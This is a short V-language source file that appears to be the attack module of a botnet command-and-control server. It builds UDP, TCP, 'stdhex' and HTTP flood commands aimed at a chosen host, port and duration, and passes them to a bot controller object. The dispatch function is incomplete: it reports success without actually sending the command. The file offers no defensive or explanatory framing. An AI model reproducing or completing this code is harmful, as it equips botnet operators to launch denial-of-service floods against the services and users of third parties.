module attack

import core.cnc

pub fn (mut a AttackInfo) generate_cmd() string {
	match a.method {
		"udpplain" {
			return "udpplain ${a.host} ${a.port} ${a.time}"
		}
		"tcp" {
			return "tcp ${a.host} ${a.port} ${a.time}"
		}
		"stdhex" {
			return "stdhex ${a.host} ${a.port} ${a.time}"
		}
		"http" {
			return "http ${a.host} ${a.time}"
		} else { return "" }
	}
	return ""
}

pub fn send_attack(mut a AttackInfo, mut b cnc.Bot_CNC) Attack {
	cmd := a.generate_cmd()
	if cmd.len < 2 { return Responses.invalid_method }
	return Responses.success
	
}